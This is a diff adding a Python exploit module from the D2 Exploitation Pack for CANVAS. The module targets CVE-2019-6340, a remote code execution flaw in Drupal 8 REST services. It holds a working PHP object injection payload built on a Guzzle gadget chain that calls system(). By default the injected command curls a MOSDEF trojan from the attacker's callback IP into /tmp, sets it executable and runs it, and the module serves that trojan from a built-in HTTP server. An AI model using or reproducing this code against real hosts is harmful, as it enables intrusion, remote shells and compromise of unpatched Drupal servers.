@@ -1,0 +1,286 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+import sys
+import random
+import time
+import thread
+import base64
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+import re
+
+# GUI info
+NAME = "Drupal 8 RESTful Web Services Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in Drupal 8 RESTful Web Services"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Drupal"
+DOCUMENTATION["Date public"] = "2019.02.20"
+DOCUMENTATION["VersionsAffected"] = "8.5.x < 8.5.11 / 8.6.x < 8.6.10"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://www.drupal.org/sa-core-2019-003"
+DOCUMENTATION["CVE Name"] = "CVE-2019-6340"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6340"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+Drupal caches responses so if it fails try another node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.host = ""    
+    	self.cmd = ""        
+    	self.basepath = "/"    
+    	self.protocol = "http"
+    	self.port = 80
+    	self.sslport = 443
+    	self.https = 0        
+    	self.trojanname = "d2"                
+    	return
+
+ 
+    def maketrojan(self):    	
+    	t_os = canvasos("Linux")
+    	t_os.arch = "X64"	    
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
+    	file(self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0	
+    	return ret	
+
+
+    def makesploit(self, clientheader, clientbody):            	
+    	h = spkproxy.header('SERVER')
+    	b = spkproxy.body()            	
+      
+    	self.maketrojan()
+                
+    	if clientheader.URL.count(self.trojanname):
+    		self.log("Sending MOSDEF trojan")
+    		f = open(self.trojanname, "rb")
+    		sploitstring = f.read()
+    		f.close()
+    		os.remove(self.trojanname)
+    		self.log("Sending %d bytes"%len(sploitstring))
+    		h.addHeader("Content-type","binary/octet-stream")
+    		h.addHeader("Connection","close")
+    		b.setBody(sploitstring)
+
+    	return h, b
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import LINUXMOSDEF_X64
+    	return [LINUXMOSDEF_X64]
+
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(80, "0.0.0.0")
+
+        if not s:
+            if self.port < 1024:
+                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                         "you can try to bind to a higher port" % self.port)
+            else:
+                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = spkproxy.header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = spkproxy.body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+    	return 1    	
+    
+
+    def run(self):    	    	
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))
+    	self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    	self.https = int(self.argsDict.get("https", self.https))
+    	self.basepath = self.argsDict.get("basepath", self.basepath)     
+    	self.cmd = self.argsDict.get("cmd", self.cmd)
+    	                                
+    	if (self.argsDict.get("cmd", self.cmd) == ""):    		
+    		self.maketrojan()	    		
+    		self.TROJANMODE = 1   
+    		self.cmd = "rm -f /tmp/" + self.trojanname + "; /usr/bin/curl -o /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname + "; /bin/chmod 777 /tmp/" + self.trojanname + "; /tmp/" + self.trojanname 
+    		thread.start_new_thread(self.startHTTPServer,())		    			    		    		
+    	else:
+    		self.cmd = self.argsDict.get("cmd", self.cmd)
+        	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                
+      		                
+        # Exploitation
+        href = "%s://%s%s%s" % (self.protocol, self.host, self.basepath, "/rest/type/shortcut/default")        
+        params = """{
+  "link": [
+    {
+      "value": "link",
+      "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:%d:\\"%s\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}"
+    }
+  ],
+  "_links": {
+    "type": {
+      "href": "%s"
+    }
+  }
+}"""%(len(self.cmd),self.cmd,href)
+        
+    	url = "/node/1?_format=hal_json"       
+    	mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)    
+    	headers = []
+    	headers.append(("Content-Type", "application/hal+json"))    	
+    	data = spkproxy.urlopen(mainurl, extraheaders=headers, data=params, exploit=None, verb='GET')        	            	                        
+                            	        
+        if self.TROJANMODE == 0:                           
+    		self.log('[D2] %s'%(data.getvalue().rsplit(']}',1)[1]))
+                                    
+    	return 1
+ 
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
